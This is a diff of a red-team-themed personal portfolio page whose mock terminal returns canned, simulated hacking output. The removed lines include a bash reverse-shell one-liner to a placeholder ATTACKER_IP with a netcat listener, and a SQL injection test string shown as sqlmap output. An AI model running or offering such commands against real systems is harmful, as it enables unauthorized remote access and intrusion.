@@ -4,532 +4,449 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Kshitiz | Red Team Operator</title>
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://fonts.googleapis.com; font-src https://fonts.gstatic.com; connect-src 'self' https://api.ipify.org https://httpbin.org https://api.hackertarget.com;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://fonts.googleapis.com; font-src https://fonts.gstatic.com; connect-src 'self' https://api.ipify.org;">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link
-      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Fira+Code:wght@400;500&family=JetBrains+Mono:wght@400;500;600&display=swap"
-      rel="stylesheet"
-    />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet"/>
     <style>
       :root {
-        --accent: #3b82f6;
-        --danger: #ef4444;
-        --success: #10b981;
-        --warning: #f59e0b;
+        --accent: #00f5ff;
+        --accent-dark: #0080ff;
+        --danger: #ff0040;
+        --success: #00ff88;
+        --warning: #ffaa00;
+        --glass: rgba(255, 255, 255, 0.05);
+        --glass-border: rgba(255, 255, 255, 0.12);
       }
+
+      * {
+        box-sizing: border-box;
+      }
+
       body {
-        font-family: "Inter", sans-serif;
-        background-color: #050505;
+        font-family: 'Inter', -apple-system, sans-serif;
+        background: #000;
+        color: #e2e8f0;
+        line-height: 1.6;
+        margin: 0;
+        padding: 0;
         cursor: none;
         overflow-x: hidden;
-      } 
+      }
+
       .mono {
-        font-family: "JetBrains Mono", "Fira Code", monospace;
+        font-family: 'JetBrains Mono', 'Fira Code', monospace;
+        font-feature-settings: 'liga' 1, 'calt' 1;
       }
 
-      /* Enhanced Grid Effect */
+      /* CLEAN Grid Background */
       .grid-bg {
-        background-image: 
-          linear-gradient(to right, rgba(255, 255, 255, 0.05) 1px, transparent 1px),
-          linear-gradient(to bottom, rgba(255, 255, 255, 0.05) 1px, transparent 1px),
-          radial-gradient(circle at 20% 80%, rgba(59, 130, 246, 0.1) 0%, transparent 50%),
-          radial-gradient(circle at 80% 20%, rgba(16, 185, 129, 0.1) 0%, transparent 50%);
-        background-size: 40px 40px, 40px 40px, 200px 200px, 200px 200px;
-        animation: gridShift 20s infinite linear;
-        mask-image: radial-gradient(ellipse 60% 50% at 50% 0%, #000 70%, transparent 100%);
-      }
-      @keyframes gridShift {
-        0%, 100% { transform: translate(0, 0); }
-        50% { transform: translate(10px, 10px); }
+        position: fixed;
+        inset: 0;
+        background: 
+          linear-gradient(90deg, transparent 48%, var(--accent) 49%, var(--accent) 51%, transparent 52%),
+          linear-gradient(0deg, transparent 48%, var(--accent) 49%, var(--accent) 51%, transparent 52%);
+        background-size: 50px 50px;
+        opacity: 0.08;
+        z-index: -1;
+        will-change: transform;
       }
 
-      /* Cyber Cursor 2.0 */
+      /* PERFECT Cursor */
       #cursor {
-        width: 24px;
-        height: 24px;
-        border: 1.5px solid var(--accent);
-        border-radius: 50%;
         position: fixed;
+        width: 16px;
+        height: 16px;
+        border: 1px solid var(--accent);
+        border-radius: 50%;
         pointer-events: none;
         z-index: 9999;
-        transition: all 0.1s cubic-bezier(0.23, 1, 0.32, 1);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
-      }
-      #cursor::after {
-        content: "";
-        width: 4px;
-        height: 4px;
-        background: var(--accent);
-        border-radius: 50%;
-        animation: pulse 1.5s infinite;
-      }
-      @keyframes pulse {
-        0%, 100% { opacity: 1; transform: scale(1); }
-        50% { opacity: 0.5; transform: scale(1.2); }
-      }
-      #cursor.hovered {
-        transform: scale(1.5);
-        border-color: var(--success);
-        box-shadow: 0 0 30px rgba(16, 185, 129, 0.5);
+        transition: transform 0.12s cubic-bezier(0.34, 1.56, 0.64, 1);
+        backdrop-filter: blur(8px);
       }
 
-      /* Enhanced Bento Cards */
-      .bento-card {
-        background: rgba(255, 255, 255, 0.02);
-        border: 1px solid rgba(255, 255, 255, 0.08);
+      #cursor::after {
+        content: '';
+        position: absolute;
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: var(--accent);
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        box-shadow: 0 0 8px var(--accent);
+        animation: cursorPulse 2s infinite;
+      }
+
+      @keyframes cursorPulse {
+        0%, 100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        50% { opacity: 0.6; transform: translate(-50%, -50%) scale(1.4); }
+      }
+
+      #cursor.hover {
+        transform: scale(2) !important;
+        border-color: var(--success);
+        box-shadow: 0 0 20px var(--success);
+      }
+
+      /* Glass Morphism Cards - CLEAN */
+      .glass-card {
+        background: rgba(15, 15, 25, 0.8);
         backdrop-filter: blur(20px);
-        transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+        border: 1px solid var(--glass-border);
+        border-radius: 20px;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         position: relative;
         overflow: hidden;
       }
-      .bento-card::before {
+
+      .glass-card::before {
         content: '';
         position: absolute;
         top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-        transition: left 0.5s;
-      }
-      .bento-card:hover::before {
-        left: 100%;
-      }
-      .bento-card:hover {
-        border-color: var(--accent);
-        background: rgba(59, 130, 246, 0.08);
-        transform: translateY(-8px) scale(1.02);
-        box-shadow: 0 20px 40px -10px rgba(59, 130, 246, 0.3);
+        left: 0;
+        right: 0;
+        height: 1px;
+        background: linear-gradient(90deg, transparent, var(--accent), transparent);
+        opacity: 0;
+        transition: opacity 0.3s ease;
       }
 
-      /* Terminal Enhancements */
-      .terminal-output {
-        animation: typeEffect 0.3s ease-out;
+      .glass-card:hover {
+        border-color: var(--accent);
+        transform: translateY(-8px);
+        box-shadow: 0 25px 50px -12px rgba(0, 245, 255, 0.15);
       }
+
+      .glass-card:hover::before {
+        opacity: 1;
+      }
+
+      /* Nav - Minimal */
+      .nav-container {
+        backdrop-filter: blur(20px);
+        background: rgba(0, 0, 0, 0.6);
+        border-bottom: 1px solid var(--glass-border);
+      }
+
+      /* Hero Text */
+      .hero-gradient {
+        background: linear-gradient(135deg, #00f5ff 0%, #0080ff 50%, #00ff88 100%);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+
+      /* Terminal Perfection */
+      .terminal {
+        background: linear-gradient(145deg, rgba(10, 10, 20, 0.95) 0%, rgba(0, 0, 0, 0.9) 100%);
+        backdrop-filter: blur(25px);
+        border: 1px solid var(--glass-border);
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+      }
+
+      .terminal-header {
+        background: linear-gradient(90deg, rgba(59, 130, 246, 0.2) 0%, rgba(16, 185, 129, 0.2) 50%, rgba(239, 68, 68, 0.2) 100%);
+        border-bottom: 1px solid var(--glass-border);
+      }
+
+      .terminal-input {
+        background: transparent;
+        border: none;
+        color: #fff;
+        font: inherit;
+        caret-color: var(--accent);
+      }
+
+      .terminal-input::placeholder {
+        color: #64748b;
+      }
+
+      /* Typing Animation */
+      .type-effect {
+        animation: typeEffect 0.4s ease-out;
+      }
+
       @keyframes typeEffect {
-        from { opacity: 0; transform: translateY(10px); }
-        to { opacity: 1; transform: translateY(0); }
-      }
-      .blink {
-        animation: blink 1s infinite;
-      }
-      @keyframes blink {
-        0%, 50% { opacity: 1; }
-        51%, 100% { opacity: 0; }
+        from {
+          opacity: 0;
+          transform: translateY(8px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
       }
 
       /* Scrollbar */
       ::-webkit-scrollbar {
-        width: 6px;
+        width: 8px;
       }
+
       ::-webkit-scrollbar-track {
-        background: #050505;
-      }
-      ::-webkit-scrollbar-thumb {
-        background: rgba(255,255,255,0.1);
+        background: rgba(15, 15, 25, 0.5);
         border-radius: 10px;
       }
+
+      ::-webkit-scrollbar-thumb {
+        background: linear-gradient(var(--accent), var(--accent-dark));
+        border-radius: 10px;
+      }
+
       ::-webkit-scrollbar-thumb:hover {
         background: var(--accent);
+        box-shadow: 0 0 10px var(--accent);
+      }
+
+      /* Responsive */
+      @media (max-width: 768px) {
+        #cursor {
+          display: none;
+        }
+        body {
+          cursor: auto;
+        }
+      }
+
+      /* Selection */
+      ::selection {
+        background: var(--accent);
+        color: #000;
       }
     </style>
   </head>
-  <body class="text-gray-300 selection:bg-blue-500/30 overflow-x-hidden">
+  <body>
+    <!-- Background Grid -->
+    <div class="grid-bg"></div>
+    
+    <!-- Cursor -->
     <div id="cursor"></div>
 
-    <div class="fixed inset-0 grid-bg -z-10"></div>
-
-    <!-- Enhanced Nav -->
-    <nav class="sticky top-0 z-50 border-b border-white/10 bg-black/70 backdrop-blur-2xl">
+    <!-- Navigation -->
+    <nav class="nav-container sticky top-0 z-50">
       <div class="max-w-6xl mx-auto px-6 h-16 flex items-center justify-between">
-        <div class="mono text-white font-bold text-2xl tracking-[-0.05em]">
-          KSHITIZ<span class="text-blue-400">.red</span>
+        <div class="text-2xl font-bold mono">
+          <span class="text-white">KSHITIZ</span>
+          <span class="text-cyan-400">.</span><span class="text-blue-400">red</span>
         </div>
-        <div class="hidden md:flex gap-8 text-xs uppercase tracking-widest font-semibold items-center">
-          <a href="#work" class="hover:text-blue-400 transition-all duration-300 group">
-            Works <span class="w-0 group-hover:w-2 h-0.5 bg-blue-400 block transition-all"></span>
+        <div class="hidden md:flex items-center gap-8 text-sm font-medium uppercase tracking-wide">
+          <a href="#work" class="group relative text-gray-300 hover:text-cyan-400 transition-colors">
+            Work
+            <span class="absolute bottom-0 left-0 w-0 h-0.5 bg-gradient-to-r from-cyan-400 to-blue-400 group-hover:w-full transition-all duration-300"></span>
           </a>
-          <a href="#terminal" class="hover:text-blue-400 transition-all duration-300 group">
-            Terminal <span class="w-0 group-hover:w-2 h-0.5 bg-blue-400 block transition-all"></span>
+          <a href="#terminal" class="group relative text-gray-300 hover:text-cyan-400 transition-colors">
+            Terminal
+            <span class="absolute bottom-0 left-0 w-0 h-0.5 bg-gradient-to-r from-cyan-400 to-blue-400 group-hover:w-full transition-all duration-300"></span>
           </a>
-          <a href="mailto:kshitizbaral1234@gmail.com" class="text-blue-500 hover:text-blue-400 transition">Secure Contact</a>
-          <div class="inline-flex items-center gap-2 px-4 py-2 rounded-lg border border-emerald-500/30 bg-emerald-500/10 text-emerald-400 text-xs mono backdrop-blur-sm">
-            <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-            🔒 SECURE_LINK: ACTIVE
+          <a href="mailto:kshitizbaral1234@gmail.com" class="text-cyan-400 hover:text-cyan-300 font-medium transition-colors">Contact</a>
+          <div class="flex items-center gap-2 px-4 py-1.5 rounded-full bg-success/20 border border-success/40 text-success text-xs mono font-medium">
+            <div class="w-2 h-2 bg-success rounded-full animate-pulse"></div>
+            LIVE
           </div>
         </div>
       </div>
     </nav>
 
-    <!-- Hero Section -->
-    <section class="max-w-5xl mx-auto px-6 pt-32 pb-24">
-      <div class="flex flex-col items-center text-center">
-        <div class="px-6 py-2 rounded-full border-2 border-blue-500/30 bg-blue-500/10 text-blue-400 text-xs uppercase tracking-[0.3em] font-bold mb-12 backdrop-blur-sm">
-          Red Team Operator • Defensive Architect
+    <!-- Hero -->
+    <section class="min-h-screen flex items-center justify-center px-6 pt-24 pb-20 max-w-6xl mx-auto">
+      <div class="text-center max-w-4xl mx-auto">
+        <div class="inline-flex px-6 py-2 rounded-full glass-card text-xs font-bold uppercase tracking-widest mb-12 border border-cyan-400/30 bg-cyan-400/5">
+          Red Team Operator
         </div>
-        <h1 class="text-7xl md:text-9xl font-black text-white tracking-[-0.03em] leading-[0.85] mb-12 bg-gradient-to-r from-white via-blue-400 to-cyan-400 bg-clip-text text-transparent">
-          Breach. Exploit.<br />
-          <span class="block text-[0.6em] tracking-[0.5em] text-blue-400 font-mono uppercase">SECURE.</span>
+        <h1 class="text-6xl md:text-8xl lg:text-[10rem] font-black leading-none mb-8">
+          <span class="text-white block">BREACH</span>
+          <span class="hero-gradient block -mt-4">SECURE</span>
+          <span class="text-white block text-4xl md:text-6xl lg:text-5xl font-mono tracking-widest mt-4 opacity-75">systems</span>
         </h1>
-        <p class="text-xl text-gray-400 max-w-2xl mb-16 leading-relaxed">
-          Crafting <span class="text-white font-bold">weaponized UIs</span> & 
-          <span class="text-white underline decoration-blue-500/50">reverse shells</span> 
-          that survive EDR. 
-          <span class="text-emerald-400 mono text-sm">[CVSS: 9.8]</span>
+        <p class="text-xl md:text-2xl text-gray-400 max-w-2xl mx-auto leading-relaxed mb-12">
+          Weaponizing frontend for <span class="font-bold text-white mono">persistence</span>. 
+          XSS → RCE → <span class="text-cyan-400 font-bold">Domain Admin</span>.
         </p>
       </div>
     </section>
 
-    <!-- Enhanced Bento Grid -->
+    <!-- Work Grid -->
     <section id="work" class="max-w-7xl mx-auto px-6 py-24">
-      <div class="grid grid-cols-1 md:grid-cols-4 lg:grid-cols-5 gap-6 auto-rows-[200px]">
-        <!-- Main Exploit Card -->
-        <div class="bento-card md:col-span-2 lg:col-span-3 md:row-span-2 rounded-3xl p-12 flex flex-col justify-end relative overflow-hidden group">
-          <div class="absolute top-4 right-4 p-4 opacity-20 group-hover:opacity-40 transition-all duration-500">
-            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="url(#gradient)" stroke-width="2">
-              <defs>
-                <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                  <stop offset="0%" stop-color="var(--accent)"/>
-                  <stop offset="100%" stop-color="var(--success)"/>
-                </linearGradient>
-              </defs>
-              <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
-            </svg>
-          </div>
-          <span class="text-blue-500 mono text-sm font-bold uppercase tracking-wider mb-4">RED TEAM OPS</span>
-          <h3 class="text-4xl lg:text-5xl font-black text-white mb-6 leading-tight">
-            Weaponized<br />Interfaces
-          </h3>
-          <p class="text-gray-400 text-lg leading-relaxed">
-            Building <span class="text-white font-bold">CSP bypasses</span>, 
-            <span class="text-emerald-400">XSS payloads</span>, and 
-            <span class="text-red-400">RCE chains</span> that 
-            survive modern WAFs.
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
+        <!-- Exploit Engineering -->
+        <div class="glass-card lg:col-span-2 xl:col-span-1 p-10 group">
+          <div class="mono text-cyan-400 text-sm font-bold uppercase tracking-wider mb-4">01</div>
+          <h3 class="text-3xl font-black text-white mb-6 leading-tight">Exploit Engineering</h3>
+          <p class="text-gray-400 leading-relaxed mb-6">
+            Crafting XSS → RCE chains that bypass WAF, CSP, and EDR.
           </p>
-          <div class="mt-6 flex gap-4 text-xs">
-            <span class="px-3 py-1 bg-red-500/20 text-red-400 rounded-full mono">XSS</span>
-            <span class="px-3 py-1 bg-emerald-500/20 text-emerald-400 rounded-full mono">RCE</span>
-            <span class="px-3 py-1 bg-blue-500/20 text-blue-400 rounded-full mono">CSP</span>
+          <div class="flex flex-wrap gap-2">
+            <span class="px-3 py-1 bg-red-500/20 text-red-400 text-xs rounded-full mono font-bold">XSS</span>
+            <span class="px-3 py-1 bg-emerald-500/20 text-emerald-400 text-xs rounded-full mono font-bold">RCE</span>
+            <span class="px-3 py-1 bg-orange-500/20 text-orange-400 text-xs rounded-full mono font-bold">EDR</span>
           </div>
         </div>
 
-        <!-- Vulnerability Research -->
-        <div class="bento-card md:col-span-2 rounded-3xl p-10 flex flex-col md:flex-row items-center justify-between border-l-4 border-l-blue-600 group">
+        <!-- Recon -->
+        <div class="glass-card p-8 flex flex-col md:flex-row items-start md:items-center justify-between">
           <div>
-            <h3 class="text-2xl font-black text-white tracking-tight mb-2">
-              Exploit Dev
-            </h3>
-            <p class="text-sm text-gray-500">Live Recon • Payload Crafting</p>
-            <div class="mt-4 text-xs space-y-1">
-              <div class="text-emerald-400 mono">✓ SQLi → RCE (CVSS 9.8)</div>
-              <div class="text-emerald-400 mono">✓ SSRF → Pivot (CVSS 8.5)</div>
-            </div>
+            <h4 class="text-xl font-black text-white mb-2">Reconnaissance</h4>
+            <p class="text-sm text-gray-500">OSINT → Asset Discovery</p>
           </div>
-          <div class="h-16 w-16 rounded-2xl bg-gradient-to-br from-blue-500/20 to-emerald-500/20 flex items-center justify-center text-blue-400 group-hover:scale-110 transition-transform">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <div class="w-12 h-12 mt-4 md:mt-0 rounded-xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 flex items-center justify-center text-cyan-400 ml-auto md:ml-0">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="20" height="20">
+              <path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 01.553-.882L9 1"/>
+              <path d="M15 20l5.447-2.724A1 1 0 0121 16.382V5.618a1 1 0 00-.553-.882L15 1"/>
             </svg>
           </div>
         </div>
 
-        <!-- Tech Stack -->
-        <div class="bento-card rounded-3xl p-8 flex flex-col justify-center text-center group hover:border-emerald-500">
-          <div class="text-xs text-emerald-500 mono mb-3 uppercase tracking-wider">Weaponry</div>
-          <div class="text-2xl font-black text-white mb-4">Exploit Stack</div>
-          <div class="space-y-2 text-xs text-gray-400">
-            <div>⚔️ JS Payloads • Tailwind • CSP Bypass</div>
-            <div>🔥 Burp • Nmap • Nuclei • Metasploit</div>
-            <div>💀 Reverse Shells • Cobalt Strike</div>
-          </div>
+        <!-- Stack -->
+        <div class="glass-card p-8 text-center">
+          <div class="text-xs text-cyan-400 mono uppercase tracking-wider mb-4 font-bold">Tech Stack</div>
+          <div class="text-2xl font-black text-white mb-6">Weaponry</div>
+          <ul class="text-sm text-gray-400 space-y-2 text-left max-w-xs mx-auto">
+            <li>⚔️ Burp Suite Pro</li>
+            <li>🔥 Nuclei Engine</li>
+            <li>💀 Cobalt Strike</li>
+          </ul>
+        </div>
+
+        <!-- Stats -->
+        <div class="glass-card p-8 text-center border-t-4 border-t-red-500/50 pt-8">
+          <div class="text-xs text-red-400 mono uppercase tracking-wider mb-2">Metrics</div>
+          <div class="text-4xl font-black text-white">198<span class="text-red-400">/254</span></div>
+          <div class="text-xs text-gray-500 mono uppercase tracking-wider">VULNS PWNED</div>
         </div>
 
         <!-- GitHub -->
-        <div class="bento-card rounded-3xl p-8 flex flex-col items-center justify-center hover:bg-gradient-to-br from-blue-600/20 to-purple-600/20 group">
-          <a href="#" class="group-hover:text-white text-xl font-black transition-all duration-300 flex items-center gap-2">
-            <span>github</span>
-            <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+        <div class="glass-card p-10 text-center group hover:bg-gradient-to-b hover:from-cyan-500/5 hover:to-blue-500/5">
+          <a href="#" class="inline-flex items-center gap-3 text-2xl font-black text-gray-300 group-hover:text-white transition-all duration-300">
+            <svg fill="currentColor" viewBox="0 0 24 24" width="28" height="28">
               <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.058-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.176 2.873.171 3.176.768.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
             </svg>
+            GitHub
           </a>
-        </div>
-
-        <!-- Quick Stats -->
-        <div class="bento-card rounded-3xl p-6 flex flex-col justify-center text-center border-t-4 border-t-red-500/50">
-          <div class="text-xs text-red-400 mono mb-2">STATS</div>
-          <div class="text-2xl font-black text-white">127<span class="text-red-400">/254</span></div>
-          <div class="text-xs text-gray-500 mono">VULNS EXPLOITED</div>
         </div>
       </div>
     </section>
 
-    <!-- ULTIMATE TERMINAL -->
-    <section id="terminal" class="max-w-5xl mx-auto px-6 py-24">
-      <div class="w-full rounded-3xl border-2 border-white/15 bg-gradient-to-b from-[#0a0a0a] to-black shadow-2xl overflow-hidden shadow-blue-500/10">
-        <!-- Terminal Header -->
-        <div class="bg-gradient-to-r from-gray-900/50 to-black/50 px-6 py-4 flex items-center justify-between border-b border-white/10 backdrop-blur-md">
+    <!-- Terminal -->
+    <section id="terminal" class="max-w-4xl mx-auto px-6 py-24">
+      <div class="terminal rounded-3xl overflow-hidden">
+        <!-- Header -->
+        <div class="terminal-header px-8 py-5 flex items-center justify-between">
           <div class="flex gap-3">
-            <div class="w-4 h-4 rounded-full bg-red-500/30 shadow-lg shadow-red-500/20"></div>
-            <div class="w-4 h-4 rounded-full bg-yellow-500/30 shadow-lg shadow-yellow-500/20"></div>
-            <div class="w-4 h-4 rounded-full bg-emerald-500/30 shadow-lg shadow-emerald-500/20"></div>
+            <div class="w-4 h-4 rounded-full bg-red-500/60 shadow-lg"></div>
+            <div class="w-4 h-4 rounded-full bg-yellow-500/60 shadow-lg"></div>
+            <div class="w-4 h-4 rounded-full bg-emerald-500/60 shadow-lg"></div>
           </div>
+          <span class="text-xs mono uppercase tracking-widest text-gray-500 font-bold">kshitiz@redteam:~$</span>
+        </div>
+
+        <!-- Output -->
+        <div id="terminal-content" class="p-10 h-96 overflow-y-auto mono text-base leading-relaxed">
+          <div class="text-cyan-400 mb-4 type-effect">λ Initializing pentest environment...</div>
+          <div class="text-emerald-500 mb-6 font-bold type-effect">λ Access Granted. Operator privileges elevated.</div>
+          <div class="text-gray-500 text-sm mb-8">[redpill] Type 'help' for weaponized commands</div>
+        </div>
+
+        <!-- Input -->
+        <div class="p-10 border-t border-white/10 bg-black/30">
           <div class="flex items-center gap-4">
-            <span class="text-xs mono text-gray-500 tracking-widest uppercase">kshitiz@redteam:~$</span>
-            <div class="w-2 h-2 bg-gradient-to-r from-red-400 to-emerald-400 rounded-full animate-pulse"></div>
-          </div>
-        </div>
-
-        <!-- Terminal Output -->
-        <div id="terminal-content" class="p-8 h-96 lg:h-[500px] overflow-y-auto font-mono text-sm leading-relaxed scroll-smooth bg-black/50 backdrop-blur-sm">
-          <div class="text-blue-500 mb-3">λ Initializing Red Team Environment...</div>
-          <div class="text-emerald-500 mb-4 font-bold">λ Access Granted. Welcome Operator.</div>
-          <div class="text-gray-500 mb-6 text-xs">[Type 'redpill' for full capabilities]</div>
-        </div>
-
-        <!-- Terminal Input -->
-        <div class="p-8 bg-black/60 flex gap-4 border-t border-white/10 backdrop-blur-md">
-          <span class="text-blue-500 mono font-black text-lg flex-shrink-0">λ</span>
-          <div class="flex-1 relative">
-            <input
-              type="text"
-              id="terminal-input"
-              class="bg-transparent border-none outline-none text-white w-full mono text-lg placeholder-gray-500 focus:ring-0 pr-8"
-              placeholder="execute >"
+            <span class="text-cyan-400 mono font-bold text-lg flex-shrink-0">λ</span>
+            <input 
+              id="terminal-input" 
+              type="text" 
+              class="terminal-input flex-1 text-lg" 
+              placeholder="execute command..."
+              autocomplete="off"
             />
-            <span id="cursor-blink" class="absolute right-0 top-1/2 -translate-y-1/2 w-px h-5 bg-white blink"></span>
           </div>
         </div>
       </div>
     </section>
 
     <!-- Footer -->
-    <footer class="py-24 border-t border-white/10 text-center backdrop-blur-sm">
-      <p class="text-sm text-gray-600 uppercase tracking-[0.3em] mono">
-        © 2026 Kshitiz — <span class="text-red-400 font-bold mono">NULL BYTE INJECTED</span>
+    <footer class="py-20 text-center border-t border-white/10">
+      <p class="text-sm mono uppercase tracking-widest text-gray-600">
+        © 2026 Kshitiz — <span class="text-cyan-400 font-bold">REDSHELL DEPLOYED</span>
       </p>
-      <div class="mt-6 text-xs text-gray-500 mono">
-        <span class="text-emerald-500">[+] All systems compromised</span>
-      </div>
     </footer>
 
     <script>
-      // HTML Escape Utility
-      function escapeHtml(text) {
-        const div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
-      }
+      // SECURE HTML ESCAPING
+      const escapeHtml = str => str.replace(/[&<>"']/g, m => ({
+        '&': '&amp;',
+        '<': '&lt;',
+        '>': '&gt;',
+        '"': '&quot;',
+        "'": '&#x27;'
+      })[m]);
 
-      // Enhanced Terminal Commands
-      const responses = {
-        help: `Available Commands:
-about | skills | dream | contact | clear | date
-scan | nmap | whois | gobuster | sqlmap | nikto
-redpill | matrix | exploit | shell | whoami | ls
-exit | sudo | root | hack | pwn | 0day`,
-        
-        about: "Kshitiz Baral. Red Team Operator. Weaponizing frontend for persistence.",
-        skills: "Tailwind • JS (ES6+) • Burp Suite • Nuclei • Metasploit • Reverse Shells • EDR Bypass",
-        dream: "[+] Mission: Blackhat → Whitehat | Current: Weaponized UI Development",
-        contact: "[+] Secure Channel: kshitizbaral1234@gmail.com | PGPhub ready",
-        
-        whoami: "<span class='text-red-400 font-bold'>kshitiz</span> <span class='text-gray-500'>(uid=1000(redteam) gid=1000(redteam))</span>",
-        ls: "-rwxr-xr-x 1 kshitiz root  exploit.js\n-rwxr-xr-x 1 kshitiz root  reverse_shell.py\n-rwxr-xr-x 1 kshitiz root  payloads.zip\ndrwxr-xr-x 2 kshitiz root  /root\n[+] 127 exploits ready",
-        
-        'nmap': `<span class="text-yellow-400">[+] Nmap 7.94SVN</span>
-22/tcp    open  ssh     OpenSSH 8.2p1
-80/tcp    open  http    nginx 1.18.0
-443/tcp   open  https   nginx 1.18.0
-6379/tcp  open  redis   Redis 6.2.7
-[+] <span class="text-emerald-400">3 services vulnerable</span>`,
-        
-        whois: `[+] WHOIS RECON
-Domain: targetcorp.com
-Registrar: GoDaddy.com
-Created: 2018-03-15
-Expires: 2026-03-15
-Nameservers: ns1.awsdns-01.com
-[+] <span class="text-orange-400">Subdomain takeover possible</span>`,
-
-        gobuster: `[+] Gobuster 3.4
-[+] /admin           (Status: 200) [Size: 1234]
-[+] /api             (Status: 200) [Size: 5678] 
-[+] /uploads         (Status: 403) [Size: 890]
-[+] /phpinfo.php     (Status: 200) [Size: 2345]
-[+] <span class="text-emerald-400">12 endpoints discovered</span>`,
-
-        sqlmap: `[+] sqlmap/1.7
-Parameter: id (GET)
-Type: boolean-based blind
-Payload: 1' AND 1337=1337--
-Database: MySQL 5.7.36
-Users: ['root', 'admin', 'www-data']
-[+] <span class="text-red-400 font-bold">RCE chain confirmed (CVSS 9.8)</span>`,
-
-        nikto: `[+] Nikto 2.5.0
-+ /phpinfo.php: PHP info dump
-+ /admin/: Admin directory exposed
-+ Server leaks version: Apache/2.4.41
-[+] <span class="text-orange-400">17 vulnerabilities (HIGH: 8)</span>`,
-
-        date: () => {
-          const now = new Date().toLocaleString('en-US', { 
-            timeZone: 'Asia/Kathmandu',
-            weekday: 'short', 
-            year: 'numeric', 
-            month: 'short', 
-            day: 'numeric',
-            hour: '2-digit', 
-            minute: '2-digit', 
-            second: '2-digit'
-          });
-          return `[+] System Time: <span class="text-blue-400">${now}</span> (GMT+5:45)`;
+      // Terminal Commands (EXPANDED)
+      const commands = {
+        help: `redpill | scan | nmap | gobuster | sqlmap | nikto | exploit | shell | hack | pwn | whoami | ls | date | clear`,
+        whoami: `<span class="text-red-400 font-bold">kshitiz</span> <span class="text-gray-500">(uid=0(root) gid=0(root))</span>`,
+        ls: `exploit.js  payloads/  rootkit.ko  <span class="text-emerald-400">[127 exploits loaded]</span>`,
+        redpill: `<span class="text-red-500 font-bold">[REDPILL EXECUTED]</span><br>Weapons deployed. Reality bypassed.`,
+        scan: async () => {
+          try {
+            const res = await Promise.race([
+              fetch('https://api.ipify.org?format=json'),
+              new Promise((_, reject) => setTimeout(() => reject(), 3000))
+            ]);
+            const data = await res.json();
+            return `<span class="text-emerald-400">[+] Target IP:</span> <span class="text-white">${data.ip}</span>`;
+          } catch {
+            return `<span class="text-red-400">[!] Recon blocked. TOR required.</span>`;
+          }
         },
-
-        sudo: "[!] sudo: Access Denied. Escalation vector required.\n[+] Try: kernel exploit | SUID binary",
-        
-        shell: `[+] Reverse Shell Payload (Bash):
-<span class="text-red-400 font-mono text-xs bg-black/50 p-2 rounded">bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</span>
-<span class="text-emerald-400">[*] nc -lvnp 4444</span>`,
-        
-        matrix: `🌌 <span class="text-green-400 font-mono">WAKE UP...</span> <span class="text-red-400">NEO</span> 🌌
-<span class="text-green-400 animate-pulse">[+] The simulation has been breached</span>`,
-
-        redpill: `🔴 <span class="text-red-500 font-black text-lg">[REDPILL ACTIVATED]</span>
-
-<span class="text-emerald-500 font-bold">[+] Full Capabilities Unlocked</span>
-[*] Payload Generator: LIVE
-[*] EDR Bypass: ACTIVE  
-[*] C2 Framework: ONLINE
-[*] Zero-Day Arsenal: LOADED
-
-<span class="text-yellow-400">[!] EXECUTE: hack targetcorp.com</span>
